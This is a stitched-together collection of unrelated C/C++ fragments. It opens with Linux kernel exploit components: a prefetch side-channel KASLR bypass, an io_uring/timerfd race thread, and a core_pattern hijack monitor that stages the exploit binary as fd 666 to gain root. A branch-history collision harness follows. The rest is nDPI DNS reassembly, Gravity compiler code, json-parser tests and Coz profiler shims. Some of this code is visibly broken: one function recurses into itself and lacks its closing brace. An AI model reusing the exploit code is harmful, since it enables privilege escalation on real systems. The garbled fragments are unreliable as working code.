void pin_on_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

inline __attribute__((always_inline)) unsigned long rdtsc_begin()
{
    unsigned long a, d;
    asm volatile (
        "mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

inline __attribute__((always_inline)) unsigned long rdtsc_end()
{
    unsigned long a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

inline __attribute__((always_inline)) void prefetch(void *p)
{
    asm volatile (
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r" (p));
}

unsigned long flushandreload(void *addr)
{
    unsigned long time = rdtsc_begin();
    prefetch(addr);
    unsigned long delta = rdtsc_end() - time;
    return delta;
}

unsigned long leak_kaslr(unsigned long base)
{
    if (!base) {
      #ifdef KASLR_BYPASS_INTEL
        #define OFFSET 0
        #define START (0xffffffff81000000ull + OFFSET)
        #define END   (0xffffffffD0000000ull + OFFSET)
        #define STEP   0x0000000001000000ull
        while (1) {
            unsigned long bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                unsigned long times[(END - START) / STEP] = {};
                unsigned long addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (unsigned long)ti;
                }

                for (int i = 0; i < 16; i++) {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                        unsigned long addr = addrs[ti];
                        unsigned long t = flushandreload((void*)addr);
                        if (t < times[ti]) {
                            times[ti] = t;
                        }
                    }
                }

                unsigned long minv = ~0;
                unsigned long mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                    if (times[ti] < minv) {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0) {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
                if (c == 0) {
                    base = bases[i];
                } else if (base == bases[i]) {
                    c++;
                } else {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
                if (base == bases[i]) {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2) {
                base -= OFFSET;
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %lx with %d votes\n", base, c);
        }
      #else
        #define START (0xffffffff81000000ull)
        #define END (0xffffffffc0000000ull)
        #define STEP 0x0000000000200000ull
        #define NUM_TRIALS 7
        // largest contiguous mapped area at the beginning of _stext
        #define WINDOW_SIZE 11

        while (1) {
            unsigned long bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                unsigned long times[(END - START) / STEP] = {};
                unsigned long addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (unsigned long)ti;
                }

                for (int i = 0; i < 16; i++) {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                        unsigned long addr = addrs[ti];
                        unsigned long t = flushandreload((void*)addr);
                        if (t < times[ti]) {
                            times[ti] = t;
                        }
                    }
                }

                unsigned long max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
                    unsigned long sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++) {
                        sum += times[ti + i];
                    }
                    if (sum > max) {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
                if (c == 0) {
                    base = bases[i];
                } else if (base == bases[i]) {
                    c++;
                } else {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
                if (base == bases[i]) {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2) {
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %lx with %d votes\n", base, c);
        }
      #endif
    }

got_base:
    return base;
}

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
    struct epoll_event ev;
    ev.events = events;
    ev.data.fd = fd;
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

void do_epoll_enqueue(int fd, int fork_count)
{
    int cfd[2];
    char buf[0x10];

    socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
    for (int k = 0; k < fork_count; k++) {
        if (fork() == 0) {
            int timefds[TIMERFD_COUNT];
            int epfds[EPOLL_FD_COUNT];

            for (int i = 0; i < TIMERFD_COUNT; i++)
                timefds[i] = dup(fd);

            for (int i = 0; i < EPOLL_FD_COUNT; i++)
                epfds[i] = epoll_create(0x1);

            for (int i = 0; i < EPOLL_FD_COUNT; i++)
                for (int j = 0; j < TIMERFD_COUNT; j++)
                epoll_ctl_add(epfds[i], timefds[j], 0);

            write(cfd[1], buf, 1);
            raise(SIGSTOP);
       }
       read(cfd[0], buf, 1);
    }
    close(cfd[0]);
    close(cfd[1]);
}

void *race_mmap_thread(void *arg)
{
    // ==================== mmap thread (cpu-1) ====================
    pin_on_cpu(1);
    while (1) {
        struct itimerspec new = { .it_value.tv_nsec = timeout_mmap_thread_cpu1 };
        void *ptr;

        pthread_barrier_wait(&barrier);
        {
            timerfd_settime(tfd_for_mmap_cpu1, TFD_TIMER_CANCEL_ON_SET, &new, NULL);

            // Try to map the 0x69 io_buffer_list.
            ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ioring_fd, IORING_OFF_PBUF_RING + (0x69 << IORING_OFF_PBUF_SHIFT));
            if (ptr != MAP_FAILED) {
                munmap(ptr, 0x1000);
            }
        }
        pthread_barrier_wait(&barrier);
    }
}

void setup_core_pattern_monitor()
{
    pin_on_cpu(1);
    setsid();

    int memfd = memfd_create("", 0);
    char buf[0x100] = {};

    // Duplicate the exploit binary to memfd 666.
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    // Poll the core_pattern content and trigger segfault if it is modified.
    while (1) {
        int corefd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(corefd, buf, sizeof(buf));
        close(corefd);
        if (strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0)
            break;
        sleep(1);
    }
    *(unsigned long *)0 = 0;
}

void c_out_of_place_for_if_collider(uint8_t *history, void *target, uint8_t *arg) {
  for (int i = 0; i < MAX_HISTORY_SIZE; i++) {
    if (history[i]) { asm volatile("nop"); }
  }
  void(* fptr)(uint8_t*) = target;
  clflush((void*)&fptr);
  fence();
  lfence();
  fptr(arg);
}

int doit() {
  //Flush
  clflush(fr_buf);
  fence();   //Ensure all memory operations are done

  //Train hit_history -> hit_gadget
  FIRST_FILL(hit_history, &hit_gadget, fake_fr_buf);

  //See if ret_history still collides
  SECOND_FILL(ret_history, &ret_gadget, fr_buf);

  //Reload
  return load_time(fr_buf) < 150;
}

uint32_t xorshift128()
{
  /* Algorithm "xor128" from p. 5 of Marsaglia, "Xorshift RNGs" */
  uint32_t t  = state.x[3];
  uint32_t s  = state.x[0];  /* Perform a contrived 32-bit shift. */
  state.x[3] = state.x[2];
  state.x[2] = state.x[1];
  state.x[1] = s;
  t ^= t << 11;
  t ^= t >> 8;
  return state.x[0] = t ^ s ^ (s >> 19);
}

int main(int argc, char **argv)
{
  int hits = 0;

  state.x[0] = time(0);
  state.x[1] = time(0);
  state.x[2] = time(0);
  state.x[3] = time(0);
  for (int i = 0; i < 100; i++) xorshift128();

  fr_buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  memset(fr_buf, 0x41, 0x1000);
  fake_fr_buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  memset(fake_fr_buf, 0x41, 0x1000);

  // Define once the target history
  for (int i = 0; i < MAX_HISTORY_SIZE; i++) {
    hit_history[i] = xorshift128() & 1;
  }
  // Randomize the whole history once
  for (int i = 0; i < MAX_HISTORY_SIZE; i++) {
    ret_history[i] = xorshift128() & 1;
  }

  long long maybes = 0;
  long long itnum = 0;
  int numcols = 0;
  int recheck_at = -1;
  int confirmed = 0;
  while (1) {
    itnum++;

    for (int i = CONTROL_FROM; i < CONTROL_TO; i++) {
      ret_history[i] = xorshift128() & 1;
    }

    hits = doit();
    if (hits > 0) {
      maybes++;
      //printf("hits: %d/%d\n", hits, ITERS);

#define CONFIRM 10000
      int sumhits = 0;
      for (int j = 0; j < CONFIRM; j++) {
        sumhits += doit();
      }
      if (sumhits > CONFIRM / 2) {
        numcols++;
        // Real deal!
        printf("got >half (%d) on avg; history was:\n", sumhits);
        printf("hit: ");
        for (int i = MAX_HISTORY_SIZE - 40; i < MAX_HISTORY_SIZE; i++) {
          printf("%d ", hit_history[i]);
        }
        printf("\nret: ");
        for (int i = MAX_HISTORY_SIZE - 40; i < MAX_HISTORY_SIZE; i++) {
          printf("%d ", ret_history[i]);
        }
        printf("\n");

        memcpy(ret_history_to_recheck, ret_history, MAX_HISTORY_SIZE);
        recheck_at = itnum + 1337;
      }
    }

    if (itnum % 100000 == 0) {
      int nc = confirmed;
      if (nc == 0) nc = 1;
      printf("%lld maybes; %d collisions (%d confirmed) @ %lld itnum (%lldk per)\n",
             maybes, numcols, confirmed, itnum, itnum/nc/1000);
    }
    hits = 0;

    if (itnum == recheck_at) {
      memcpy(ret_history, ret_history_to_recheck, MAX_HISTORY_SIZE);
      int sumhits = 0;
      for (int j = 0; j < CONFIRM; j++) {
        sumhits += doit();
      }
      printf("  Just rechecking after 1337 iterations... Got %d (%d%%)\n", sumhits, sumhits*100/CONFIRM);
      if (sumhits > CONFIRM / 10) { // relaxed to 10% for confirmation
        confirmed++;
      }
      continue;
    }

  }

  return 0;
}

static void dns_tcp_reasm_free_dir(struct ndpi_dns_tcp_reasm *reasm)
{
  if(reasm->buf != NULL) {
    ndpi_free(reasm->buf);
    reasm->buf = NULL;
  }

  reasm->cur_len = 0;
  reasm->msg_len = 0;
}

static void dns_tcp_reasm_enable_extra(struct ndpi_detection_module_struct *ndpi_struct,
				       struct ndpi_flow_struct *flow)
{
  if(flow->extra_packets_func != NULL ||
     flow->detected_protocol_stack[0] == NDPI_PROTOCOL_UNKNOWN)
    return;

  if(!ndpi_struct->cfg.dns_parse_response_enabled)
    return;

  if(flow->detected_protocol_stack[0] == NDPI_PROTOCOL_LLMNR ||
     flow->detected_protocol_stack[1] == NDPI_PROTOCOL_LLMNR)
    return;

  flow->max_extra_packets_to_check = ndpi_struct->cfg.dns_max_packets_extra_dissection;
  flow->extra_packets_func = search_dns_again;
}

static int dns_tcp_reasm_append(struct ndpi_dns_tcp_reasm *reasm,
				const u_int8_t *data, u_int16_t len)
{
  u_int32_t new_len;
  u_int8_t *new_buf;

  if(len == 0)
    return 0;

  new_len = (u_int32_t)reasm->cur_len + len;
  if(new_len > (u_int32_t)(DNS_TCP_MAX_MSG_LEN + 2))
    return -1;

  if(reasm->buf == NULL) {
    reasm->buf = ndpi_malloc(new_len);
    if(reasm->buf == NULL)
      return -1;

    memcpy(reasm->buf, data, len);
    reasm->cur_len = len;
    return 0;
  }

  new_buf = (u_int8_t *)ndpi_realloc(reasm->buf, new_len);
  if(new_buf == NULL)
    return -1;

  reasm->buf = new_buf;

  memcpy(&reasm->buf[reasm->cur_len], data, len);
  reasm->cur_len = new_len;

  return 0;
}

static void dns_tcp_reasm_consume(struct ndpi_dns_tcp_reasm *reasm, u_int32_t consumed)
{
  if(consumed >= reasm->cur_len) {
    dns_tcp_reasm_free_dir(reasm);
    return;
  }

  memmove(reasm->buf, &reasm->buf[consumed], reasm->cur_len - consumed);
  reasm->cur_len -= consumed;
  reasm->msg_len = 0;
}

static int dns_tcp_process(struct ndpi_detection_module_struct *ndpi_struct,
			   struct ndpi_flow_struct *flow)
{
  struct ndpi_packet_struct *packet = &ndpi_struct->packet;
  struct ndpi_dns_tcp_reasm *reasm = NULL;
  const u_int8_t *original_payload;
  u_int16_t original_payload_len;
  u_int32_t msg_len, total_len, offset;
  int processed = 0;

  original_payload = packet->payload;
  original_payload_len = packet->payload_packet_len;

  /* Message already split: append this segment and parse from the reassembly buffer. */
  if(flow->dns_tcp_reasm != NULL) {
    reasm = &flow->dns_tcp_reasm->dir[packet->packet_direction];
    if(reasm->buf != NULL || reasm->cur_len > 0)
      goto append_and_reasm;
  }

  /* Fast path: dissect every complete length-prefixed message in this TCP payload. */
  for(offset = 0; offset + 2 <= original_payload_len; ) {
    msg_len = ntohs(get_u_int16_t(&original_payload[offset], 0));
    if(msg_len < sizeof(struct ndpi_dns_packet_header) ||
       msg_len > DNS_TCP_MAX_MSG_LEN)
      return -1;

    total_len = 2 + msg_len;
    if(offset + total_len > original_payload_len)
      break; /* incomplete message: handled below */

    if(msg_len == 0) {
      offset += 2;
      continue;
    }

    packet->payload = (u_int8_t *)&original_payload[offset];
    packet->payload_packet_len = (u_int16_t)total_len;
    search_dns(ndpi_struct, flow);
    processed = 1;

    packet->payload = original_payload;
    packet->payload_packet_len = original_payload_len;
    offset += total_len;
  }

  /*
   * Fast path finished the whole segment (no trailing bytes for reassembly).
   * Return 1 if we dissected at least one message; 0 otherwise.
   */
  if(offset >= original_payload_len)
    return processed > 0 ? 1 : 0;

  /* Split segment: store only the trailing bytes; wait for the next TCP packet. */
  if(flow->dns_tcp_reasm == NULL) {
    flow->dns_tcp_reasm = ndpi_calloc(1, sizeof(struct ndpi_dns_tcp_reasm_state));
    if(flow->dns_tcp_reasm == NULL)
      return -1;
  }

  reasm = &flow->dns_tcp_reasm->dir[packet->packet_direction];
  if(dns_tcp_reasm_append(reasm, &original_payload[offset],
			  (u_int16_t)(original_payload_len - offset)) < 0) {
    dns_tcp_reasm_free_dir(reasm);
    return -1;
  }

  dns_tcp_reasm_enable_extra(ndpi_struct, flow);
  return processed > 0 ? 1 : 0;

append_and_reasm:
  if(dns_tcp_reasm_append(reasm, packet->payload, packet->payload_packet_len) < 0) {
    dns_tcp_reasm_free_dir(reasm);
    return -1;
  }

  /* Decode complete messages from the buffer; leave a short tail if still incomplete. */
  while(1) {
    if(reasm->cur_len < 2) {
      dns_tcp_reasm_enable_extra(ndpi_struct, flow);
      packet->payload = original_payload;
      packet->payload_packet_len = original_payload_len;
      return processed > 0 ? 1 : 0;
    }

    if(reasm->msg_len == 0) {
      msg_len = ntohs(get_u_int16_t(reasm->buf, 0));
      if(msg_len < sizeof(struct ndpi_dns_packet_header) ||
         msg_len > DNS_TCP_MAX_MSG_LEN) {
        dns_tcp_reasm_free_dir(reasm);
        packet->payload = original_payload;
        packet->payload_packet_len = original_payload_len;
      }
      reasm->msg_len = msg_len;
    } else
      msg_len = reasm->msg_len;

    total_len = 2 + msg_len;

    if(reasm->cur_len < total_len) {
      dns_tcp_reasm_enable_extra(ndpi_struct, flow);
      packet->payload = original_payload;
      packet->payload_packet_len = original_payload_len;
      return processed > 0 ? 1 : 0;
    }

    if(msg_len == 0) {
      dns_tcp_reasm_consume(reasm, 2);
      continue;
    }

    packet->payload = (u_int8_t *)reasm->buf;
    packet->payload_packet_len = (u_int16_t)total_len;
    search_dns(ndpi_struct, flow);
    processed = 1;

    packet->payload = original_payload;
    packet->payload_packet_len = original_payload_len;

    dns_tcp_reasm_consume(reasm, total_len);
  }
}

static uint32_t newline_length (int c, int n, int n2) {
    if (c == 0x0A) return 1;
    if (c == 0x0D) return (n == 0x0A) ? 2 : 1;
    if ((c == 0xC2) && (n == 0x85)) return 2;
    if ((c == 0xE2) && (n == 0x80) && (n2 == 0xA8)) return 3;
    return 0;
}

static void gravity_compiler_reset (gravity_compiler_t *compiler) {
    if (compiler->vm) {
        gravity_vm_free(compiler->vm);

        // release the core reference taken by gravity_compiler_run when the mini VM was created,
        // so that register/release stay balanced no matter how many times the compiler is run.
        // Core is really freed only when its refcount drops to zero, so a real VM created with
        // gravity_vm_new (which owns its own reference) keeps core and optionals alive.
        gravity_core_free();
    }
    gravity_compiler_reset(compiler);
    // CODEGEN requires a mini vm in order to be able to handle garbage collector.
    // The mini VM is just a container for the transfer/cleanup callbacks (it holds no
    // per-compilation state) so it is created once and reused by every subsequent run
    // of the same compiler: creating a new one here would orphan the previous one and
    // would take an extra core reference that nothing releases.
    if (!compiler->vm) {
        compiler->vm = gravity_vm_newmini();
        gravity_vm_setdata(compiler->vm, (void *)compiler);
        gravity_vm_set_callbacks(compiler->vm, internal_vm_transfer, internal_vm_cleanup);

        // core reference owned by the mini VM, released by gravity_compiler_reset
        gravity_core_register(compiler->vm);
    }
    gravity_compiler_reset(compiler);

static uintptr_t object_name_bytes_get (const json_value * value)
{
   uintptr_t bytes;
   memcpy (&bytes, &value->u.object.values, sizeof (bytes));
   return bytes;
}

static void object_name_bytes_add (json_value * value, uintptr_t size)
{
   uintptr_t bytes = object_name_bytes_get (value) + size;
   memcpy (&value->u.object.values, &bytes, sizeof (bytes));
}

static void check (int ok, const char *what) {
    ++checks;
    if (ok) return;
    ++failures;
    printf("Fail! %s\n", what);
}

static json_value *parse_exact (const char *buffer, size_t len) {
    char *exact = (char *)malloc(len ? len : 1);
    if (!exact) { printf("Fail! out of memory\n"); exit(1); }
    memcpy(exact, buffer, len);

    json_value *value = json_parse(exact, len);

    free(exact);
    return value;
}

static json_value *parse_with_trap (const char *buffer, size_t len, char trap) {
    char *padded = (char *)malloc(len + 1);
    if (!padded) { printf("Fail! out of memory\n"); exit(1); }
    memcpy(padded, buffer, len);
    padded[len] = trap;

    json_value *value = json_parse(padded, len);

    free(padded);
    return value;
}

static void test_truncated (void) {
    for (size_t i = 0; i < sizeof(truncated) / sizeof(truncated[0]); ++i) {
        json_value *value = parse_exact(truncated[i], strlen(truncated[i]));
        char what[128];
        snprintf(what, sizeof(what), "truncated input `%s` was accepted", truncated[i]);
        check(value == NULL, what);
        json_value_free(value);
    }

    // A literal cut one byte short, with the missing byte sitting just past the
    // end of the buffer. Reading it completes the literal at top level, so the
    // parse succeeds and the check below fails on a build with no sanitizer.
    // Only these three are decisive: completing a truncated \uXXXX escape still
    // leaves the string unterminated, so the escape guards are covered by the
    // exact sized allocations above and need ASan to be seen.
    static const struct { const char *text; char trap; } traps[] = {
        {"tru",  'e'},
        {"fals", 'e'},
        {"nul",  'l'},
    };

    for (size_t i = 0; i < sizeof(traps) / sizeof(traps[0]); ++i) {
        json_value *value = parse_with_trap(traps[i].text, strlen(traps[i].text), traps[i].trap);
        char what[128];
        snprintf(what, sizeof(what), "`%s` was completed by reading the byte past the buffer",
                 traps[i].text);
        check(value == NULL, what);
        json_value_free(value);
    }
}

static void test_every_prefix (void) {
    for (size_t i = 0; i < sizeof(seeds) / sizeof(seeds[0]); ++i) {
        size_t full = strlen(seeds[i]);

        for (size_t len = 0; len < full; ++len)
            json_value_free(parse_exact(seeds[i], len));

        json_value *value = parse_exact(seeds[i], full);
        char what[128];
        snprintf(what, sizeof(what), "valid input `%s` was rejected", seeds[i]);
        check(value != NULL, what);
        json_value_free(value);
    }
}

static void test_exact_fit (void) {
    static const struct { const char *text; json_type type; } cases[] = {
        {"true",  json_boolean},
        {"false", json_boolean},
        {"null",  json_null},
        {"\"\\u0041\"", json_string},
        {"\"\\uD83D\\uDE00\"", json_string},
    };

    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); ++i) {
        json_value *value = parse_exact(cases[i].text, strlen(cases[i].text));
        char what[128];
        snprintf(what, sizeof(what), "`%s` ending on the last byte was rejected", cases[i].text);
        check(value != NULL && value->type == cases[i].type, what);
        json_value_free(value);
    }

    // check the decoded content too, so a bounds fix cannot pass by silently
    // dropping the last escape
    json_value *value = parse_exact("\"\\u0041\"", 8);
    check(value != NULL && value->type == json_string
          && value->u.string.length == 1 && value->u.string.ptr[0] == 'A',
          "\\u0041 did not decode to `A`");
    json_value_free(value);

    // U+1F600 encodes to the four UTF-8 bytes F0 9F 98 80
    value = parse_exact("\"\\uD83D\\uDE00\"", 14);
    check(value != NULL && value->type == json_string
          && value->u.string.length == 4
          && memcmp(value->u.string.ptr, "\xF0\x9F\x98\x80", 4) == 0,
          "surrogate pair did not decode to U+1F600");
    json_value_free(value);
}

static void test_object_keys (void) {
    static const char text[] =
        "{\"a\":1,\"bb\":2,\"ccc\":3,\"\":4,\"dddddddddddddddddddd\":5}";
    static const char *const names[] = {"a", "bb", "ccc", "", "dddddddddddddddddddd"};

    json_value *value = parse_exact(text, sizeof(text) - 1);
    check(value != NULL && value->type == json_object, "object with mixed key lengths was rejected");
    if (!value || value->type != json_object) { json_value_free(value); return; }

    check(value->u.object.length == 5, "wrong number of object entries");

    for (unsigned int i = 0; i < value->u.object.length && i < 5; ++i) {
        json_object_entry *entry = &value->u.object.values[i];
        char what[160];
        snprintf(what, sizeof(what), "entry %u: expected key `%s`, got `%s`", i, names[i], entry->name);
        check(entry->name_length == strlen(names[i])
              && strcmp(entry->name, names[i]) == 0, what);
        snprintf(what, sizeof(what), "entry %u: expected value %u", i, i + 1);
        check(entry->value != NULL && entry->value->type == json_integer
              && entry->value->u.integer == (json_int_t)(i + 1), what);
    }

    json_value_free(value);
}

static int hex_digit (char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return -1;
}

static void test_loadbuffer (void) {
    const size_t hexlen = sizeof(issue448_poc) - 1;
    const size_t len = hexlen / 2;

    check(hexlen % 2 == 0 && len == 520, "issue #448 sample is not 520 bytes");

    // an exact sized buffer, exactly as a fuzz harness or an embedder loading
    // bytecode out of mapped memory would pass it
    char *poc = (char *)malloc(len);
    if (!poc) { printf("Fail! out of memory\n"); exit(1); }
    for (size_t i = 0; i < len; ++i)
        poc[i] = (char)((hex_digit(issue448_poc[i * 2]) << 4) | hex_digit(issue448_poc[i * 2 + 1]));

    gravity_delegate_t delegate = {.error_callback = report_error};
    gravity_vm *vm = gravity_vm_new(&delegate);
    check(vm != NULL, "unable to create a VM");

    if (vm) {
        gravity_closure_t *closure = gravity_vm_loadbuffer(vm, poc, len);
        check(closure == NULL, "issue #448 sample was accepted by gravity_vm_loadbuffer");

        // the degenerate case of the same path
        closure = gravity_vm_loadbuffer(vm, "", 0);
        check(closure == NULL, "empty buffer was accepted by gravity_vm_loadbuffer");

        gravity_vm_free(vm);
    }

    free(poc);
    gravity_core_free();
}

int main (void) {
    test_truncated();
    test_every_prefix();
    test_exact_fit();
    test_object_keys();
    test_loadbuffer();

    printf("Checks run successfully: %d/%d. %d failed\n", checks - failures, checks, failures);
    return (failures == 0) ? 0 : 1;
}

static uint64_t mach_ticks_to_ns(uint64_t ticks) {
  static mach_timebase_info_data_t timebase = {0, 0};
  if (timebase.denom == 0) mach_timebase_info(&timebase);
  return ticks * timebase.numer / timebase.denom;
}

uint64_t macos_effective_sample_period_ns() {
  uint64_t eff = g_effective_period_ns.load(std::memory_order_relaxed);
  if (eff < g_sample_period_ns) return g_sample_period_ns;
  uint64_t cap = g_sample_period_ns * 100;
  return eff > cap ? cap : eff;
}

static void coz_shim_resolve(void) {
  /* libcoz is injected by `coz run` via LD_PRELOAD / DYLD_INSERT_LIBRARIES, so
   * its symbols live in the global scope and RTLD_DEFAULT finds them. Without
   * the profiler these stay NULL and every entry point degrades to a no-op. */
  s_get_counter = (coz_get_counter_t)dlsym(RTLD_DEFAULT, "_coz_get_counter");
  s_add_delays = (coz_add_delays_t)dlsym(RTLD_DEFAULT, "_coz_add_delays");
  s_pre_block = (coz_pre_block_t)dlsym(RTLD_DEFAULT, "_coz_pre_block");
  s_post_block = (coz_post_block_t)dlsym(RTLD_DEFAULT, "_coz_post_block");
}

coz_counter_t *coz_shim_get_counter(int type, const char *name) {
  coz_shim_ensure();
  if (s_get_counter == NULL) return NULL;
  return s_get_counter(type, name);
}

coz_counter_t *coz_shim_cached_counter(int type, const char *name) {
  coz_counter_t *result = NULL;

  pthread_mutex_lock(&s_cache_lock);
  for (coz_shim_entry *e = s_cache; e != NULL; e = e->next) {
    if (e->type == type && strcmp(e->name, name) == 0) {
      result = e->counter;
      pthread_mutex_unlock(&s_cache_lock);
      return result;
    }
  }

  result = coz_shim_get_counter(type, name);

  /* Cache misses (result == NULL, i.e. not profiling) too, so that an
   * un-profiled run does not call into dlsym-resolved code on every hit. */
  coz_shim_entry *entry = (coz_shim_entry *)malloc(sizeof(coz_shim_entry));
  if (entry != NULL) {
    entry->name = strdup(name);
    if (entry->name == NULL) {
      free(entry);
    } else {
      entry->type = type;
      entry->counter = result;
      entry->next = s_cache;
      s_cache = entry;
    }
  }
  pthread_mutex_unlock(&s_cache_lock);

  return result;
}

void coz_shim_hit(coz_counter_t *counter) {
  if (counter == NULL) return;

  __atomic_add_fetch(&counter->count, 1, __ATOMIC_RELAXED);

#ifdef __APPLE__
  /* macOS has no per-thread sampling timer, so a worker thread only learns of
   * the virtual delay it owes when it reaches a progress point. On Linux the
   * SIGPROF handler already applies delays, and doing it again here would apply
   * them twice. This is the _COZ_CHECK_DELAYS split from include/coz.h. */
  if (s_add_delays != NULL) s_add_delays();
#endif
}

static string main_executable_path() {
  char buffer[PATH_MAX];
  ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);
  if(len <= 0) return string();
  buffer[len] = '\0';
  return string(buffer);
}

static bool inflate_zlib(const uint8_t* src, size_t src_size, size_t dest_size,
                         std::vector<uint8_t>* out) {
  out->resize(dest_size);
  uLongf produced = static_cast<uLongf>(dest_size);
  const int rc = uncompress(out->data(), &produced, src, static_cast<uLong>(src_size));
  if (rc != Z_OK || produced != dest_size) {
    out->clear();
    return false;
  }
  return true;
}

static bool inflate_zdebug(const uint8_t* data, size_t size, std::vector<uint8_t>* out) {
  const size_t kHeader = 12;
  if (size < kHeader || std::memcmp(data, "ZLIB", 4) != 0) return false;

  uint64_t dest_size = 0;
  for (int i = 0; i < 8; i++) {
    dest_size = (dest_size << 8) | data[4 + i];
  }
  return inflate_zlib(data + kHeader, size - kHeader, static_cast<size_t>(dest_size), out);
}

static bool inflate_shf_compressed(const uint8_t* data, size_t size, bool is_64bit,
                                   std::vector<uint8_t>* out) {
  // 32-bit: ch_type(4) ch_size(4) ch_addralign(4). 64-bit adds 4 bytes of padding.
  const size_t kHeader = is_64bit ? 24 : 12;
  if (size < kHeader) return false;

  uint32_t ch_type = 0;
  std::memcpy(&ch_type, data, sizeof(ch_type));
  if (ch_type != 1 /* ELFCOMPRESS_ZLIB */) return false;

  uint64_t dest_size = 0;
  if (is_64bit) {
    std::memcpy(&dest_size, data + 8, sizeof(dest_size));
  } else {
    uint32_t narrow = 0;
    std::memcpy(&narrow, data + 4, sizeof(narrow));
    dest_size = narrow;
  }
  return inflate_zlib(data + kHeader, size - kHeader, static_cast<size_t>(dest_size), out);
}

static stack_t* coz_alt_stack() {
  static thread_local stack_t storage;
  static thread_local bool ready = false;

  if(!ready) {
    void* mem = mmap(NULL, CozMinAltStackSize, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    if(mem == MAP_FAILED) return NULL;
    storage.ss_sp = mem;
    storage.ss_size = CozMinAltStackSize;
    storage.ss_flags = 0;
    ready = true;
  }
  return &storage;
}

int sigaltstack(const stack_t* ss, stack_t* old_ss) {
    if(ss != NULL && (ss->ss_flags & SS_DISABLE) == 0 && ss->ss_size < CozMinAltStackSize) {
      stack_t* mine = coz_alt_stack();
      if(mine != NULL) {
        stack_t enlarged = *ss;
        enlarged.ss_sp = mine->ss_sp;
        enlarged.ss_size = mine->ss_size;
        return real::sigaltstack(&enlarged, old_ss);
      }
    }
    return real::sigaltstack(ss, old_ss);
  }

static int resolve_sigaltstack(const stack_t* ss, stack_t* old_ss) throw() {
  GET_SYMBOL(sigaltstack);
  if(real_sigaltstack) return real_sigaltstack(ss, old_ss);
  else return -1;
}

long coz_dispatch_semaphore_wait(dispatch_semaphore_t sema, dispatch_time_t timeout) {
  if (!coz_initialized()) return orig_dispatch_semaphore_wait(sema, timeout);
  coz_block_enter();
  long result = orig_dispatch_semaphore_wait(sema, timeout);
  coz_block_exit(result == 0);
  return result;
}

static void* slow_work(void*) {
  uint64_t acc = 0x9E3779B97F4A7C15ULL;
  for (uint64_t i = 0; i < kIterations; i++) acc = xorshift(acc);
  slow_sink = acc;
  sem_signal();
  return nullptr;
}

static void* fast_work(void*) {
  uint64_t acc = 0x9E3779B97F4A7C15ULL;
  for (uint64_t i = 0; i < kIterations / 2; i++) acc = xorshift(acc);
  fast_sink = acc;
  sem_signal();
  return nullptr;
}

int main() {
  sem_setup();
  printf("Starting.\n");
  for (int round = 0; round < 100; round++) {
    pthread_t a, b;
    pthread_create(&a, nullptr, slow_work, nullptr);
    pthread_create(&b, nullptr, fast_work, nullptr);
    sem_wait_one();   // main blocks here -- invisible to coz without the wrappers
    sem_wait_one();
    pthread_detach(a);
    pthread_detach(b);
    COZ_PROGRESS;
    printf("."); fflush(stdout);
  }
  printf("\nDone. %llu %llu\n", (unsigned long long)slow_sink, (unsigned long long)fast_sink);
}

